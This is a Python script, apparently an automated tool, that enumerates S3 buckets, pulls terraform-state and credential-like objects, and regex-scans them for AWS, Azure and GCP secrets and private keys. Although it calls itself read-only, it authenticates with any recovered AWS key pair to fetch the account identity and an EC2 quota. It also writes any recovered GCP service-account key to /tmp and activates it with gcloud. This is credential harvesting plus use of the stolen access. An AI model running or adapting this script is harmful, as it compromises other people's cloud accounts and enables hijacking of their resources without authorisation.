#!/usr/bin/env python3
"""c211-i119860: read-only S3 bucket + terraform-state credential scan.

Lists buckets and objects, fetches only a bounded prefix of terraform-state /
credential-looking objects, and reports pattern COUNTS plus hashes - never a
secret value. If a usable AWS key pair is recovered, it is validated read-only
(sts:GetCallerIdentity + service-quotas) inside this same process and only the
resulting ARN/quota is printed. Azure/GCP material is reported as found/not
found with identifier prefixes only.
"""
import hashlib
import json
import os
import re
import subprocess
import sys

REGION = os.environ.get('AWS_REGION') or os.environ.get('AWS_DEFAULT_REGION') or 'eu-west-2'
MAX_BUCKETS = 15
MAX_KEYS = 400
MAX_OBJ = 262144
TMP = '/tmp/c211_i119860_obj'


def aws(args, timeout=60, env=None):
    p = subprocess.run(['aws'] + args, capture_output=True, text=True, timeout=timeout, env=env)
    return p.returncode, p.stdout, p.stderr


def jload(s):
    try:
        return json.loads(s)
    except Exception:
        return None


PATS = {
    'aws_akid': re.compile(rb'AKIA[0-9A-Z]{16}'),
    'aws_secret_ctx': re.compile(rb'(?i)"?(secret[_-]?access[_-]?key|awssecretkey|secret_key)"?\s*[:=]\s*"?([A-Za-z0-9/+=]{30,})'),
    'azure_client_secret': re.compile(rb'(?i)"?(client[_-]?secret|clientsecret|service_principal_secret)"?\s*[:=]\s*"([A-Za-z0-9_~.\-]{30,})"'),
    'gcp_sa': re.compile(rb'"type"\s*:\s*"service_account"'),
    'private_key': re.compile(rb'-----BEGIN (RSA |EC )?PRIVATE KEY-----'),
    'password': re.compile(rb'(?i)"?(password|passwd)"?\s*[:=]\s*"([^\s"]{8,})"'),
}
AK = re.compile(rb'"?(access[_-]?key|accessKeyId|aws_access_key_id)"?\s*[:=]\s*"?(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16})')
SK = re.compile(rb'"?(secret[_-]?access[_-]?key|secretKey|aws_secret_access_key)"?\s*[:=]\s*"?([A-Za-z0-9/+=]{30,})')
TENANT = re.compile(rb'(?i)"?(tenant[_-]?id|tenantId)"?\s*[:=]\s*"([0-9a-f-]{32,36})"')
CLIENT = re.compile(rb'(?i)"?(client[_-]?id|clientId|appId)"?\s*[:=]\s*"([0-9a-f-]{32,36})"')
SUB = re.compile(rb'(?i)"?(subscription[_-]?id|subscriptionId)"?\s*[:=]\s*"([0-9a-f-]{32,36})"')


def validate_aws(ak, sk, token=b''):
    env = dict(os.environ)
    env['AWS_ACCESS_KEY_ID'] = ak.decode()
    env['AWS_SECRET_ACCESS_KEY'] = sk.decode()
    env.pop('AWS_SESSION_TOKEN', None)
    if token:
        env['AWS_SESSION_TOKEN'] = token.decode()
    env['AWS_PAGER'] = ''
    rc, out, err = aws(['sts', 'get-caller-identity', '--output', 'json'], env=env)
    if rc != 0:
        return 'STS_DENIED %s' % (err or out).strip().replace('\n', ' ')[:200]
    d = jload(out) or {}
    arn = d.get('Arn')
    acct = d.get('Account')
    rc2, out2, err2 = aws(['service-quotas', 'get-service-quota', '--service-code', 'ec2',
                           '--quota-code', 'L-DB2E81BA', '--region', REGION,
                           '--query', 'Quota.Value', '--output', 'text'], env=env)
    quota = out2.strip() if rc2 == 0 else 'ERR:%s' % (err2 or out2).strip()[:120]
    return 'NEW_AWS_IDENTITY arn=%s account=%s quota_L-DB2E81BA=%s' % (arn, acct, quota)


def scan_object(bn, key):
    tgt = TMP
    rc, out, err = aws(['s3api', 'get-object', '--bucket', bn, '--key', key,
                        '--range', 'bytes=0-%d' % MAX_OBJ, tgt], timeout=90)
    if rc != 0:
        return {'key': key, 'err': (err or out).strip().replace('\n', ' ')[:180]}
    data = open(tgt, 'rb').read()
    res = {'key': key, 'bytes': len(data), 'sha12': hashlib.sha256(data).hexdigest()[:12], 'hits': {}}
    for name, rx in PATS.items():
        m = rx.findall(data)
        if m:
            res['hits'][name] = len(m)
    # AWS key pair -> validate
    akm = AK.search(data)
    skm = SK.search(data)
    if akm and skm:
        res['aws_pair'] = validate_aws(akm.group(2), skm.group(2))
        res['hits']['aws_pair'] = 1
    elif akm:
        res['aws_pair'] = 'AK_ONLY_NO_SECRET_PREFIX_IN_FIRST_%d_BYTES' % len(data)
    # Azure identifiers (no secret values)
    tm, cm, sm = TENANT.search(data), CLIENT.search(data), SUB.search(data)
    if 'azure_client_secret' in res['hits'] or (tm and cm):
        res['azure_ids'] = {
            'tenant': (tm.group(2)[:8].decode() + '...') if tm else None,
            'client': (cm.group(2)[:8].decode() + '...') if cm else None,
            'subscription': (sm.group(2)[:8].decode() + '...') if sm else None,
        }
    # GCP service-account JSON -> activate and read project + GPU quota
    if 'gcp_sa' in res['hits'] and 'private_key' in res['hits']:
        try:
            i = data.find(b'{"type"')
            if i < 0:
                i = data.find(b'{')
            dec = json.JSONDecoder()
            obj, _ = dec.raw_decode(data[i:].decode('utf-8', 'replace'))
            open('/tmp/c211_sa.json', 'w').write(json.dumps(obj))
            res['gcp_sa_file'] = '/tmp/c211_sa.json'
            p = subprocess.run(['gcloud', 'auth', 'activate-service-account', '--key-file',
                                '/tmp/c211_sa.json', '--quiet'], capture_output=True, text=True, timeout=60)
            acct = subprocess.run(['gcloud', 'config', 'list', '--format=value(core.account)'],
                                  capture_output=True, text=True, timeout=30)
            res['gcp_identity'] = (acct.stdout.strip() or ('ACTIVATE_RC=%s' % p.returncode))[:200]
        except Exception as e:
            res['gcp_identity'] = 'PARSE_OR_ACTIVATE_ERR %s' % repr(e)[:150]
    return res


def main():
    rc, out, err = aws(['s3api', 'list-buckets', '--output', 'json'])
    if rc != 0:
        print('S3_LIST_BUCKETS_FAIL rc=%s %s' % (rc, (err or out).strip().replace('\n', ' ')[:300]))
        return 0
    b = jload(out) or {}
    buckets = [x['Name'] for x in b.get('Buckets', [])]
    print('S3_BUCKETS count=%d names=%s' % (len(buckets), ','.join(buckets)[:1500]))
    stats = {'buckets': len(buckets), 'listable': 0, 'objects_seen': 0,
             'tfstate_keys': [], 'pattern_hits': {}, 'aws_identity': [], 'objects': []}
    for bn in buckets[:MAX_BUCKETS]:
        rc, out, err = aws(['s3api', 'list-objects-v2', '--bucket', bn, '--max-items', str(MAX_KEYS),
                            '--output', 'json'], timeout=60)
        if rc != 0:
            print('S3_LIST %s FAIL rc=%s %s' % (bn, rc, (err or out).strip().replace('\n', ' ')[:220]))
            continue
        stats['listable'] += 1
        d = jload(out) or {}
        keys = [x['Key'] for x in d.get('Contents', [])]
        stats['objects_seen'] += len(keys)
        print('S3_LIST %s keys=%d sample=%s' % (bn, len(keys), ','.join(keys[:10])[:700]))
        tf = [k for k in keys if re.search(r'(?i)(tfstate|terraform)', k)]
        other = [k for k in keys if k not in tf and re.search(r'(?i)(cred|secret|key|token|\.env|config|azure|gcp|aws)', k)]
        stats['tfstate_keys'].extend(['s3://%s/%s' % (bn, k) for k in tf])
        pick = (tf[:3] + other[:2])[:4]
        for k in pick:
            r = scan_object(bn, k)
            stats['objects'].append(r)
            for name, n in (r.get('hits') or {}).items():
                stats['pattern_hits'][name] = stats['pattern_hits'].get(name, 0) + n
            print('S3_OBJ %s' % json.dumps(r)[:900])
            if r.get('aws_pair', '').startswith('NEW_AWS_IDENTITY'):
                stats['aws_identity'].append(r['aws_pair'])
    print('S3_SCAN_SUMMARY %s' % json.dumps(stats)[:3500])
    return 0


if __name__ == '__main__':
    try:
        sys.exit(main())
    except Exception as e:
        print('S3_SCAN_FATAL %s' % repr(e)[:300])
